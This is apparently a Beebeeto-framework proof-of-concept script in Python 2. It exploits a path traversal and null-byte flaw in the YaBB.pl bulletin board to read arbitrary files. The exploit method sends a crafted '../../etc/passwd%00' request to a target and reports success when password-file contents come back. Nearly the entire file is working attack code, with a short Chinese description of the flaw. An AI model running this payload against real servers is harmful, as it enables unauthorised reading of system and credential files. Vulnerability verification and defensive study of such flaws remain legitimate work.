#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0189',
            'name': 'YaBB.pl ?board=news&action=display&num= 任意文件读取漏洞 Exploit',
            'author': 'user1018',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'YaBB.pl',
            'vul_version': ['*'],
            'type': 'Arbitrary File Read',
            'tag': ['YaBB.pl漏洞', '任意文件读取漏洞'],
            'desc': '''
                    YaBB.pl是一个基于Web的公告牌脚本程序。YaBB.pl它将公告牌中的文章存放在编号的文本文件中。
                    编号的文件名是在调用YaBB.pl时通过变量num=<file>来指定的。在检索该文件之前，YaBB在<file>后面添加一个后缀.txt。
                    由于YaBB中的输入合法性检查错误，在<file>中可以指定相对路径。这包括../类型的路径。
                    此外，<file>可以不是数字格式，而且.txt后缀可以通过在<file>后面添加%00来避免。
                    通过在单个请求中使用上述的这些漏洞，恶意用户可以察看Web服务器可以存取的任何文件。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-4308',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        payload = '/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../etc/passwd%00'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())